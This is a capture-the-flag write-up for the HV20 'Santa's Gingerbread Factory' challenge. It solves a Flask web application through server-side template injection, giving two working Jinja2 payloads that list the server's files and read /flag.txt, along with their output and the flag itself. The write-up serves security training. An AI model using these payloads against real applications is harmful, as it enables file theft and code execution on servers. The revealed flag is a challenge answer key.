[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)


# Day 09 / HV20.09 Santa's Gingerbread Factory



## Challenge

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
* Author: inik
* Tags:   `#penetration-testing` `#web-security`
* Level:  Medium


### Introduction

Here you can customize your absolutely fat-free gingerbread man.

Note: Start your personal instance from the `RESOURCES` section on top.


### Goal / Mission

Besides the gingerbread men, there are other goodies there. Let's see if you
can get the goodie, which is stored in /flag.txt.



## Solution

The website is a [Flask] web application and the topic is [Flask injection].

[Flask]: https://en.wikipedia.org/wiki/Flask_(web_framework)
[Flask injection]: https://blog.nvisium.com/injecting-flask

Starting with a simple injection like `{{ 4 * 4 }}` – which evaluates to `16` –
after a lot of trial and error one of many solutions can be discovered …

1. A file listing injection:
   
   ```python
   {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').listdir('.')}}
   ```

   ```
   The ginger bread man says: 
    -------------------------------
   ( Hello, mighty ['bin', 'boot', )
   ( 'dev', 'etc', 'home', 'lib',  )
   ( 'lib64', 'media', 'mnt',      )
   ( 'opt', 'proc', 'root', 'run', )
   ( 'sbin', 'srv', 'sys', 'tmp',  )
   ( 'usr', 'var', '.dockerenv',   )
   ( 'flag.txt']                   )
    -------------------------------
   ```

2. An injection to extract the flag:

   ```python
   {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open'](''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').path.join('.','flag.txt')).read()}}
   ```

   ```
   The ginger bread man says:
    --------------------------------
   ( Hello, mighty HV20{SST1_N0t_0N )
   ( LY_H1Ts_UB3R!!!}               )
    --------------------------------
   ```

--------------------------------------------------------------------------------

Flag: `HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}`

[← Day 08](../day08/) / [↑ TOC](../README.md) / [→ Day 10](../day10/)
